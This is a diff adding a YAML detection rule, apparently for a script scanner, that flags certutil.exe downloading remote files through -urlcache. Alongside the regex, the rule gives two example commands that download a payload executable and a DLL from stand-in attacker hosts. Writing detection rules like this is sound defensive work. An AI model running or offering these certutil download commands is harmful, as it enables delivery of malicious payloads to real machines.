@@ -1,0 +1,35 @@
+# PowerShell Pattern: Certutil Download Cradle
+# Detects abuse of certutil.exe for downloading files
+
+id: PS-028
+name: Certutil Download Cradle
+description: |
+  Detects abuse of certutil.exe with -urlcache parameter to download files
+  from remote URLs. Certutil is a legitimate Windows utility for managing
+  certificates, but attackers frequently abuse it as a "Living Off the Land"
+  binary (LOLBin) to download malicious payloads while evading detection.
+  This technique is commonly used in initial access and payload delivery.
+languages:
+  - powershell
+detection_type: regex
+detection_logic: 'certutil(?:\.exe)?\s+.*-urlcache.*(?:http|ftp|https)'
+severity: High
+mitre_technique: T1105
+confidence: 0.9
+category: command-and-control
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-19"
+  references:
+    - "https://attack.mitre.org/techniques/T1105/"
+    - "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+    - "https://www.microsoft.com/en-us/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/"
+  tags:
+    - lolbin
+    - download-cradle
+    - certutil
+    - file-transfer
+  examples:
+    - "certutil.exe -urlcache -split -f http://attacker.com/payload.exe C:\\temp\\payload.exe"
+    - "certutil -urlcache -f https://evil.com/malware.dll malware.dll"
